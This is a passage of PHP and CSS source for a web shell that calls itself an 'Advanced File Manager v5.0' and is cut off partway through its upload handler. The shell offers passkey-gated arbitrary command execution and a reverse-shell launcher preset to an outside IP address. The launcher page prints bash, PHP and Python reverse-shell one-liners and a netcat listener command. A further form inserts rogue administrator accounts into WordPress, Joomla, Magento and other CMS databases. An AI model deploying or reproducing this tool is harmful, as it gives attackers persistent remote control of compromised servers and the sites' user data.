            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border-radius: 0 0 15px 15px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
        }
        .terminal-title {
            font-size: 24px;
            color: var(--accent-color);
            text-shadow: 0 2px 10px rgba(244, 164, 96, 0.5);
            margin-bottom: 5px;
            letter-spacing: 1px;
            font-weight: bold;
        }
        .terminal-subtitle {
            font-size: 12px;
            color: rgba(255, 248, 220, 0.7);
            margin-bottom: 10px;
            letter-spacing: 0.5px;
        }
        .current-path {
            background: rgba(139, 69, 19, 0.2);
            padding: 12px;
            border-radius: 8px;
            margin: 10px 0;
            border-left: 3px solid var(--accent-color);
            font-size: 14px;
            overflow-x: auto;
            white-space: nowrap;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(244, 164, 96, 0.1);
        }
        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px;
            margin: 20px;
            padding: 20px;
            background: rgba(91, 191, 184, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            border: 1px solid rgba(244, 164, 96, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }
        .control-btn {
            background: linear-gradient(145deg, rgba(139, 69, 19, 0.3), rgba(91, 191, 184, 0.2));
            color: var(--light-color);
            border: 1px solid rgba(244, 164, 96, 0.3);
            padding: 14px 15px;
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
        }
        .control-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(244, 164, 96, 0.2), transparent);
            transition: left 0.6s;
        }
        .control-btn:hover::before { left: 100%; }
        .control-btn:hover {
            background: linear-gradient(145deg, rgba(244, 164, 96, 0.4), rgba(139, 69, 19, 0.3));
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 10px 25px rgba(244, 164, 96, 0.3);
            border-color: var(--accent-color);
        }
        .form-container {
            background: rgba(91, 191, 184, 0.1);
            backdrop-filter: blur(15px);
            padding: 25px;
            border-radius: 15px;
            margin: 20px;
            border: 1px solid rgba(244, 164, 96, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }
        .form-input {
            width: 100%;
            padding: 12px;
            background: rgba(139, 69, 19, 0.2);
            border: 1px solid rgba(244, 164, 96, 0.3);
            color: var(--light-color);
            font-family: inherit;
            margin-bottom: 15px;
            border-radius: 8px;
            transition: all 0.3s;
        }
        .form-input:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 15px rgba(244, 164, 96, 0.2);
            background: rgba(139, 69, 19, 0.3);
        }
        .form-textarea {
            width: 100%;
            min-height: 300px;
            padding: 15px;
            background: rgba(139, 69, 19, 0.2);
            border: 1px solid rgba(244, 164, 96, 0.3);
            color: var(--light-color);
            font-family: 'Courier New', monospace;
            margin-bottom: 15px;
            border-radius: 8px;
            resize: vertical;
            transition: all 0.3s;
        }
        .form-textarea:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 15px rgba(244, 164, 96, 0.2);
            background: rgba(139, 69, 19, 0.3);
        }
        .submit-btn {
            background: linear-gradient(145deg, rgba(139, 69, 19, 0.8), rgba(91, 191, 184, 0.6));
            color: white;
            border: none;
            padding: 14px 30px;
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            font-size: 14px;
            transition: all 0.4s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
        }
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.6s;
        }
        .submit-btn:hover::before { left: 100%; }
        .submit-btn:hover {
            background: linear-gradient(145deg, rgba(244, 164, 96, 0.8), rgba(139, 69, 19, 0.6));
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(244, 164, 96, 0.4);
        }
        .alert {
            padding: 18px;
            border-radius: 10px;
            margin: 15px;
            border-left: 4px solid var(--accent-color);
            background: rgba(91, 191, 184, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(244, 164, 96, 0.2);
        }
        .alert.success { border-left-color: var(--success-color); background: rgba(46, 125, 50, 0.1); }
        .alert.error { border-left-color: var(--danger-color); background: rgba(198, 40, 40, 0.1); }
        .alert.info { border-left-color: var(--info-color); background: rgba(2, 119, 189, 0.1); }
        .alert.warning { border-left-color: var(--warning-color); background: rgba(255, 143, 0, 0.1); }
        .cmd-output {
            background: rgba(139, 69, 19, 0.2);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px solid rgba(244, 164, 96, 0.3);
            max-height: 500px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            white-space: pre-wrap;
            backdrop-filter: blur(5px);
        }
        .file-table {
            width: 100%;
            background: rgba(91, 191, 184, 0.1);
            backdrop-filter: blur(10px);
            border-collapse: collapse;
            margin: 20px 0;
            border: 1px solid rgba(244, 164, 96, 0.2);
            border-radius: 10px;
            overflow: hidden;
        }
        .file-table th {
            background: linear-gradient(145deg, rgba(139, 69, 19, 0.5), rgba(91, 191, 184, 0.3));
            color: var(--light-color);
            padding: 15px;
            text-align: left;
            border-bottom: 2px solid rgba(244, 164, 96, 0.3);
        }
        .file-table td {
            padding: 12px;
            border-bottom: 1px solid rgba(244, 164, 96, 0.1);
            transition: background 0.3s;
        }
        .file-table tr:hover td { background: rgba(244, 164, 96, 0.1); }
        .checkbox-cell { width: 40px; text-align: center; }
        .action-cell { white-space: nowrap; }
        .action-btn {
            background: none;
            border: none;
            color: var(--light-color);
            cursor: pointer;
            padding: 8px;
            border-radius: 6px;
            transition: all 0.3s;
            margin: 0 2px;
            background: rgba(139, 69, 19, 0.2);
        }
        .action-btn:hover {
            background: rgba(244, 164, 96, 0.3);
            transform: scale(1.1);
        }
        .action-btn.edit { color: #4FC3F7; }
        .action-btn.delete { color: #EF5350; }
        .action-btn.download { color: #66BB6A; }
        .action-btn.permission { color: #FFB74D; }
        .action-btn.timestamp { color: #BA68C8; }
        .action-btn.rename { color: #4DB6AC; }
        .mass-actions {
            display: flex;
            gap: 10px;
            margin: 20px;
            padding: 20px;
            background: rgba(91, 191, 184, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            border: 1px solid rgba(244, 164, 96, 0.2);
            align-items: center;
            flex-wrap: wrap;
        }
        .mass-btn {
            background: linear-gradient(145deg, rgba(139, 69, 19, 0.3), rgba(91, 191, 184, 0.2));
            color: var(--light-color);
            border: 1px solid rgba(244, 164, 96, 0.3);
            padding: 12px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            transition: all 0.4s;
            display: flex;
            align-items: center;
            gap: 8px;
            flex: 1;
            min-width: 180px;
        }
        .mass-btn:hover {
            background: linear-gradient(145deg, rgba(244, 164, 96, 0.4), rgba(139, 69, 19, 0.3));
            transform: translateY(-2px);
            border-color: var(--accent-color);
        }
        .select-all-btn {
            background: linear-gradient(145deg, rgba(46, 125, 50, 0.6), rgba(2, 119, 189, 0.4));
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            transition: all 0.4s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .select-all-btn:hover {
            background: linear-gradient(145deg, rgba(66, 165, 245, 0.8), rgba(30, 136, 229, 0.6));
            transform: translateY(-2px);
        }
        .invert-btn {
            background: linear-gradient(145deg, rgba(186, 104, 200, 0.6), rgba(156, 39, 176, 0.4));
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            font-size: 13px;
            transition: all 0.4s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .invert-btn:hover {
            background: linear-gradient(145deg, rgba(186, 104, 200, 0.8), rgba(156, 39, 176, 0.6));
            transform: translateY(-2px);
        }
        .logout-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(145deg, rgba(198, 40, 40, 0.7), rgba(139, 69, 19, 0.5));
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            z-index: 1000;
            transition: all 0.4s;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(244, 164, 96, 0.3);
        }
        .logout-btn:hover {
            background: linear-gradient(145deg, rgba(239, 83, 80, 0.8), rgba(198, 40, 40, 0.6));
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(239, 83, 80, 0.3);
        }
        .status-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(91, 191, 184, 0.15);
            backdrop-filter: blur(15px);
            border-top: 1px solid rgba(244, 164, 96, 0.3);
            padding: 12px 20px;
            font-size: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 1000;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--success-color);
            margin-right: 10px;
            animation: pulse 2s infinite;
            box-shadow: 0 0 10px var(--success-color);
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.2); opacity: 0.7; }
            100% { transform: scale(1); opacity: 1; }
        }
        .cms-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 12px;
            margin: 20px 0;
        }
        .cms-btn {
            background: rgba(139, 69, 19, 0.2);
            color: var(--light-color);
            border: 1px solid rgba(244, 164, 96, 0.3);
            padding: 18px;
            border-radius: 10px;
            cursor: pointer;
            text-align: center;
            transition: all 0.4s;
            backdrop-filter: blur(5px);
        }
        .cms-btn:hover {
            background: rgba(244, 164, 96, 0.3);
            border-color: var(--accent-color);
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(244, 164, 96, 0.2);
        }
        .quick-buttons {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        .quick-btn {
            background: rgba(139, 69, 19, 0.2);
            color: var(--light-color);
            border: 1px solid rgba(244, 164, 96, 0.3);
            padding: 10px 18px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
            flex: 1;
            min-width: 140px;
        }
        .quick-btn:hover {
            background: rgba(244, 164, 96, 0.3);
            border-color: var(--accent-color);
            transform: translateY(-2px);
        }
        .pre-command {
            background: rgba(139, 69, 19, 0.2);
            padding: 12px;
            border-radius: 8px;
            margin: 12px 0;
            border-left: 3px solid var(--accent-color);
            font-family: 'Courier New', monospace;
            font-size: 12px;
            word-break: break-all;
            border: 1px solid rgba(244, 164, 96, 0.1);
        }
        .info-line {
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 1px dashed rgba(244, 164, 96, 0.3);
        }
        .info-label {
            color: rgba(255, 248, 220, 0.7);
            display: inline-block;
            width: 200px;
            font-weight: bold;
        }
        .info-value { color: var(--accent-color); }
        .permission-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .permission-group {
            background: rgba(139, 69, 19, 0.15);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid rgba(244, 164, 96, 0.2);
            backdrop-filter: blur(5px);
        }
        .permission-title {
            font-weight: bold;
            margin-bottom: 15px;
            color: var(--accent-color);
            font-size: 14px;
        }
        .permission-checkbox { margin: 10px 0; display: flex; align-items: center; }
        .permission-checkbox input[type="checkbox"] {
            margin-right: 10px;
            transform: scale(1.2);
        }
        .file-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .info-card {
            background: rgba(139, 69, 19, 0.15);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid rgba(244, 164, 96, 0.2);
        }
        .info-card-title {
            color: rgba(255, 248, 220, 0.7);
            font-size: 12px;
            margin-bottom: 5px;
        }
        .info-card-value {
            color: var(--accent-color);
            font-family: monospace;
            font-size: 14px;
        }
        @keyframes glow {
            0% { box-shadow: 0 0 5px rgba(244, 164, 96, 0.5); }
            50% { box-shadow: 0 0 20px rgba(244, 164, 96, 0.8); }
            100% { box-shadow: 0 0 5px rgba(244, 164, 96, 0.5); }
        }
        .glowing { animation: glow 2s infinite; }
        ::-webkit-scrollbar { width: 10px; }
        ::-webkit-scrollbar-track {
            background: rgba(139, 69, 19, 0.1);
            border-radius: 5px;
        }
        ::-webkit-scrollbar-thumb {
            background: rgba(244, 164, 96, 0.3);
            border-radius: 5px;
        }
        ::-webkit-scrollbar-thumb:hover { background: rgba(244, 164, 96, 0.5); }
        .timestamp-editor {
            background: rgba(91, 191, 184, 0.1);
            backdrop-filter: blur(15px);
            padding: 25px;
            border-radius: 15px;
            margin: 20px;
            border: 1px solid rgba(244, 164, 96, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }
        .current-timestamp {
            background: rgba(139, 69, 19, 0.15);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid rgba(244, 164, 96, 0.2);
        }
        .datetime-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .datetime-field { display: flex; flex-direction: column; }
        .datetime-label {
            color: var(--text-dark);
            font-size: 12px;
            margin-bottom: 5px;
        }
        .datetime-input {
            padding: 10px;
            background: rgba(139, 69, 19, 0.2);
            border: 1px solid rgba(244, 164, 96, 0.3);
            color: var(--light-color);
            border-radius: 6px;
            font-family: inherit;
        }
        .datetime-input:focus {
            outline: none;
            border-color: var(--accent-color);
        }
        .octal-input {
            font-family: monospace;
            font-weight: bold;
            letter-spacing: 1px;
        }
        .selected-items-list {
            max-height: 200px;
            overflow-y: auto;
            margin: 15px 0;
            padding: 10px;
            background: rgba(30, 30, 30, 0.6);
            border-radius: 8px;
            border: 1px solid rgba(244, 164, 96, 0.2);
        }
        @media (max-width: 768px) {
            .controls { grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); }
            .permission-grid { grid-template-columns: 1fr; }
            .cms-grid { grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); }
            .mass-actions { flex-direction: column; }
            .mass-btn, .select-all-btn, .invert-btn { width: 100%; }
            .datetime-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <button class="logout-btn" onclick="window.location='?logout=true'">
        <i class="fas fa-sign-out-alt"></i> LOGOUT
    </button>
    
    <div class="header">
        <div class="terminal-title">⚡ ADVANCED FILE MANAGER v5.0</div>
        <div class="terminal-subtitle">Access Level: ADMIN | Session: <?php echo substr(session_id(), 0, 12); ?>...</div>
        
        <?php
        $pathComponents = explode(DIRECTORY_SEPARATOR, $path);
        echo "<div class='current-path'>";
        echo "📍 PATH: ";
        $builtPath = '';
        foreach ($pathComponents as $index => $component) {
            if ($component === '') {
                $component = '/';
                $builtPath = '/';
            } else {
                $builtPath .= ($builtPath === '/' ? '' : DIRECTORY_SEPARATOR) . $component;
            }
            
            if ($component !== '') {
                echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($builtPath) . "' style='color: var(--accent-color); text-decoration: none;'>" . htmlspecialchars($component) . "</a>";
                if ($index < count($pathComponents) - 1 && $component !== '/') {
                    echo "<span style='color: rgba(255, 248, 220, 0.5); margin: 0 5px;'>/</span>";
                }
            }
        }
        echo "</div>";
        ?>
        
        <form method="GET" style="margin-top: 15px;">
            <input type="hidden" name="passkey" value="<?php echo htmlspecialchars($_SESSION['passkey']); ?>">
            <input type="text" name="path" autocomplete="off" class="form-input" placeholder="Enter full path..." required 
                   value="<?php echo htmlspecialchars($path); ?>" style="margin-bottom: 0;">
        </form>
    </div>
    
    <?php
    // Define all actions
    $actions = [
        'browse' => ['icon' => 'fa-folder-open', 'label' => 'Browse Files'],
        'cmd' => ['icon' => 'fa-terminal', 'label' => 'Command'],
        'backconnect' => ['icon' => 'fa-plug', 'label' => 'Backconnect'],
        'addadmin' => ['icon' => 'fa-user-plus', 'label' => 'Add Admin'],
        'createfile' => ['icon' => 'fa-file-plus', 'label' => 'Create File/Folder'],
        'upload' => ['icon' => 'fa-upload', 'label' => 'Upload'],
        'info' => ['icon' => 'fa-info-circle', 'label' => 'System Info']
    ];
    
    echo "<div class='controls'>";
    foreach ($actions as $action => $info) {
        $active = (isset($_GET['action']) && $_GET['action'] == $action) ? 'style="background: linear-gradient(145deg, rgba(244, 164, 96, 0.4), rgba(139, 69, 19, 0.3)); border-color: var(--accent-color);"' : '';
        echo "<a href='?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "&action=" . $action . "'>
                <button class='control-btn' $active>
                    <i class='fas " . $info['icon'] . "'></i>" . $info['label'] . "
                </button>
              </a>";
    }
    echo "</div>";
    
    // Handle mass actions form
    if (isset($_GET['action']) && $_GET['action'] == 'browse' || !isset($_GET['action'])) {
        echo '<form id="massActionForm" method="POST" style="display: none;">';
        echo '<input type="hidden" name="passkey" value="' . htmlspecialchars($_SESSION['passkey']) . '">';
        echo '<input type="hidden" name="selected_items" id="selectedItems" value="">';
        echo '</form>';
    }
    
    // Handle actions
    if (isset($_GET['action'])) {
        echo "<div class='alert info'><i class='fas fa-cogs'></i> Active Mode: " . strtoupper($_GET['action']) . "</div>";
        
        switch ($_GET['action']) {
            case 'info':
                echo "<div class='form-container'>";
                echo "<h3 style='margin-bottom: 20px; color: var(--accent-color);'><i class='fas fa-server'></i> System Information</h3>";
                infomin();
                echo "</div>";
                break;
                
            case 'cmd':
                echo "<div class='form-container'>";
                echo "<h3 style='margin-bottom: 20px; color: var(--accent-color);'><i class='fas fa-terminal'></i> Command Execution</h3>";
                
                echo "<div class='alert warning'>";
                echo "<p><i class='fas fa-lightbulb'></i> <strong>Tip:</strong> Use '2>&1' at the end of commands to see error messages</p>";
                echo "</div>";
                
                echo "<form method='POST'>";
                echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
                echo "<div style='display: flex; gap: 10px; margin-bottom: 15px;'>";
                echo "<input type='text' name='cmd' class='form-input' placeholder='Enter command...' value='ls -la' style='flex: 1; margin-bottom: 0;'>";
                echo "<button type='submit' name='exec' class='submit-btn' style='margin-bottom: 0;'><i class='fas fa-play'></i> EXECUTE</button>";
                echo "</div>";
                echo "</form>";
                
                echo "<div class='quick-buttons'>";
                echo "<button class='quick-btn' onclick=\"document.querySelector('input[name=cmd]').value='pwd'\"><i class='fas fa-home'></i> pwd</button>";
                echo "<button class='quick-btn' onclick=\"document.querySelector('input[name=cmd]').value='ls -la'\"><i class='fas fa-list'></i> ls -la</button>";
                echo "<button class='quick-btn' onclick=\"document.querySelector('input[name=cmd]').value='whoami'\"><i class='fas fa-user'></i> whoami</button>";
                echo "<button class='quick-btn' onclick=\"document.querySelector('input[name=cmd]').value='id'\"><i class='fas fa-id-card'></i> id</button>";
                echo "<button class='quick-btn' onclick=\"document.querySelector('input[name=cmd]').value='uname -a'\"><i class='fas fa-desktop'></i> uname -a</button>";
                echo "</div>";
                
                if (isset($cmdOutput)) {
                    echo "<div class='cmd-output'>";
                    echo "<h4 style='color: var(--accent-color); margin-bottom: 10px;'>Command Output:</h4>";
                    echo "<pre>" . htmlspecialchars($cmdOutput) . "</pre>";
                    echo "</div>";
                }
                echo "</div>";
                break;
                
            case 'backconnect':
                echo "<div class='form-container'>";
                echo "<h3 style='margin-bottom: 20px; color: var(--accent-color);'><i class='fas fa-plug'></i> Reverse Shell (Backconnect)</h3>";
                
                echo "<div class='alert warning'>";
                echo "<p><strong><i class='fas fa-exclamation-triangle'></i> Important:</strong> Before using, start listener on your machine:</p>";
                echo "<div class='pre-command'>nc -lvnp 4444</div>";
                echo "</div>";
                
                echo "<form method='POST'>";
                echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
                
                echo "<div style='display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;'>";
                echo "<div>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'><i class='fas fa-network-wired'></i> Your IP:</label>";
                echo "<input type='text' name='bc_ip' class='form-input' value='103.26.129.56' required>";
                echo "</div>";
                
                echo "<div>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'><i class='fas fa-door-open'></i> Port:</label>";
                echo "<input type='number' name='bc_port' class='form-input' value='4444' min='1' max='65535' required>";
                echo "</div>";
                echo "</div>";
                
                echo "<div class='quick-buttons'>";
                echo "<button type='button' onclick=\"document.querySelector('input[name=bc_port]').value='4444'\" class='quick-btn'>Port 4444</button>";
                echo "<button type='button' onclick=\"document.querySelector('input[name=bc_port]').value='8080'\" class='quick-btn'>Port 8080</button>";
                echo "<button type='button' onclick=\"document.querySelector('input[name=bc_port]').value='9999'\" class='quick-btn'>Port 9999</button>";
                echo "</div>";
                
                echo "<button type='submit' name='bc_connect' class='submit-btn' style='margin-top: 20px;'><i class='fas fa-play'></i> LAUNCH REVERSE SHELL</button>";
                echo "</form>";
                
                if (isset($bcResult)) {
                    echo "<div class='alert " . ($bcResult['success'] ? 'success' : 'error') . "' style='margin-top: 20px;'>";
                    echo "<h4><i class='fas fa-" . ($bcResult['success'] ? 'check-circle' : 'times-circle') . "'></i> " . ($bcResult['success'] ? 'Success!' : 'Failed!') . "</h4>";
                    if (!empty($bcResult['output'])) {
                        echo "<div class='cmd-output' style='margin: 10px 0;'>";
                        echo "<pre>" . htmlspecialchars($bcResult['output']) . "</pre>";
                        echo "</div>";
                    }
                    echo "<p>" . htmlspecialchars($bcResult['message']) . "</p>";
                    echo "</div>";
                }
                
                echo "<div class='alert info' style='margin-top: 20px;'>";
                echo "<h4><i class='fas fa-code'></i> Manual Commands:</h4>";
                echo "<div class='pre-command'>bash -c 'bash -i >& /dev/tcp/103.26.129.56/4444 0>&1'</div>";
                echo "<div class='pre-command'>php -r '\$sock=fsockopen(\"103.26.129.56\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'</div>";
                echo "<div class='pre-command'>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"103.26.129.56\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'</div>";
                echo "</div>";
                
                echo "</div>";
                break;
                
            case 'addadmin':
                echo "<div class='form-container'>";
                echo "<h3 style='margin-bottom: 20px; color: var(--accent-color);'><i class='fas fa-user-plus'></i> Add Admin User to CMS</h3>";
                
                $cms_list = [
                    'wordpress' => ['icon' => 'fa-wordpress', 'name' => 'WordPress'],
                    'joomla' => ['icon' => 'fa-joomla', 'name' => 'Joomla'],
                    'drupal' => ['icon' => 'fa-drupal', 'name' => 'Drupal'],
                    'vbulletin' => ['icon' => 'fa-comments', 'name' => 'vBulletin'],
                    'phpbb' => ['icon' => 'fa-comments', 'name' => 'phpBB'],
                    'whmcs' => ['icon' => 'fa-shopping-cart', 'name' => 'WHMCS'],
                    'mybb' => ['icon' => 'fa-comment-alt', 'name' => 'MyBB'],
                    'phpnuke' => ['icon' => 'fa-code', 'name' => 'PHP-Nuke'],
                    'smf' => ['icon' => 'fa-comments', 'name' => 'SMF'],
                    'magento' => ['icon' => 'fa-shopping-bag', 'name' => 'Magento'],
                    'prestashop' => ['icon' => 'fa-store', 'name' => 'PrestaShop']
                ];
                
                echo "<div class='cms-grid'>";
                foreach ($cms_list as $cms_key => $cms_info) {
                    echo "<div class='cms-btn' onclick=\"document.querySelector('select[name=cms_type]').value='$cms_key'\">";
                    echo "<i class='fab {$cms_info['icon']}'></i><br>";
                    echo "<span>{$cms_info['name']}</span>";
                    echo "</div>";
                }
                echo "</div>";
                
                echo "<form method='POST'>";
                echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
                
                echo "<div style='margin-bottom: 15px;'>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>CMS Type:</label>";
                echo "<select name='cms_type' class='form-input' required>";
                foreach ($cms_list as $cms_key => $cms_info) {
                    echo "<option value='$cms_key'>{$cms_info['name']}</option>";
                }
                echo "</select>";
                echo "</div>";
                
                echo "<div style='display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;'>";
                echo "<div>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>Username:</label>";
                echo "<input type='text' name='admin_user' class='form-input' value='admin' required>";
                echo "</div>";
                
                echo "<div>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>Password:</label>";
                echo "<input type='text' name='admin_pass' class='form-input' value='Admin@123' required>";
                echo "</div>";
                echo "</div>";
                
                echo "<div style='margin-bottom: 15px;'>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>Email:</label>";
                echo "<input type='email' name='admin_email' class='form-input' value='admin@domain.com' required>";
                echo "</div>";
                
                echo "<div class='alert info'>";
                echo "<h4><i class='fas fa-database'></i> Database Configuration</h4>";
                echo "</div>";
                
                echo "<div style='display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;'>";
                echo "<div>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>Host:</label>";
                echo "<input type='text' name='db_host' class='form-input' value='localhost' required>";
                echo "</div>";
                
                echo "<div>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>Database:</label>";
                echo "<input type='text' name='db_name' class='form-input' placeholder='database_name' required>";
                echo "</div>";
                echo "</div>";
                
                echo "<div style='display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;'>";
                echo "<div>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>Username:</label>";
                echo "<input type='text' name='db_user' class='form-input' value='root' required>";
                echo "</div>";
                
                echo "<div>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>Password:</label>";
                echo "<input type='password' name='db_pass' class='form-input' placeholder=''>";
                echo "</div>";
                echo "</div>";
    
                echo "<div style='margin-bottom: 20px;'>";
                echo "<label style='display: block; margin-bottom: 5px; color: rgba(255, 248, 220, 0.7);'>Table Prefix:</label>";
                echo "<input type='text' name='db_prefix' class='form-input' placeholder='wp_, jos_, etc.'>";
                echo "</div>";
                
                echo "<button type='submit' name='add_admin_submit' class='submit-btn'><i class='fas fa-user-plus'></i> ADD ADMIN USER</button>";
                echo "</form>";
                
                if (isset($adminResult)) {
                    echo "<div class='alert " . ($adminResult['success'] ? 'success' : 'error') . "' style='margin-top: 20px;'>";
                    echo "<h4><i class='fas fa-" . ($adminResult['success'] ? 'check-circle' : 'times-circle') . "'></i> " . ($adminResult['success'] ? 'Success!' : 'Failed!') . "</h4>";
                    echo "<pre style='background: rgba(139, 69, 19, 0.2); padding: 12px; border-radius: 8px; margin: 12px 0; white-space: pre-wrap;'>";
                    echo htmlspecialchars($adminResult['message']);
                    echo "</pre>";
                    echo "</div>";
                }
                echo "</div>";
                break;
                
            case 'createfile':
                echo "<div class='form-container'>";
                echo "<h3 style='margin-bottom: 20px; color: var(--accent-color);'><i class='fas fa-file-plus'></i> Create New File / Folder</h3>";
                
                // Form untuk membuat file
                if (isset($_POST['touch']) && isset($_POST['filename'])) {
                    $filename = $_POST['filename'];
                    $filetext = $_POST['filetext'] ?? '';
                    $filePath = $path . DIRECTORY_SEPARATOR . $filename;
                    
                    if (saveme($filePath, $filetext)) {
                        echo "<div class='alert success'>✅ File created: <code>" . htmlspecialchars($filename) . "</code></div>";
                    } else {
                        echo "<div class='alert error'>❌ Failed to create file</div>";
                    }
                }
                
                // Form untuk membuat folder
                if (isset($_POST['create_folder']) && isset($_POST['folder_name'])) {
                    $folderResult = createFolder($_POST['folder_name'], $path);
                    if ($folderResult['success']) {
                        echo "<div class='alert success'>" . htmlspecialchars($folderResult['message']) . "</div>";
                    } else {
                        echo "<div class='alert error'>" . htmlspecialchars($folderResult['message']) . "</div>";
                    }
                }
                
                echo "<h4>Create File</h4>";
                echo "<form method='POST'>";
                echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
                echo "<input type='text' name='filename' class='form-input' placeholder='filename.php' required>";
                echo "<textarea class='form-textarea' name='filetext' placeholder='File content...'></textarea>";
                echo "<button type='submit' name='touch' class='submit-btn'><i class='fas fa-plus-circle'></i> CREATE FILE</button>";
                echo "</form>";
                
                echo "<h4 style='margin-top: 30px;'>Create Folder</h4>";
                echo "<form method='POST'>";
                echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
                echo "<input type='text' name='folder_name' class='form-input' placeholder='Folder name' required>";
                echo "<button type='submit' name='create_folder' class='submit-btn'><i class='fas fa-folder-plus'></i> CREATE FOLDER</button>";
                echo "</form>";
                echo "</div>";
                break;
                
            case 'upload':
                echo "<div class='form-container'>";
                echo "<h3 style='margin-bottom: 20px; color: var(--accent-color);'><i class='fas fa-cloud-upload-alt'></i> Upload File</h3>";
                
                if (isset($_FILES['upload_file'])) {
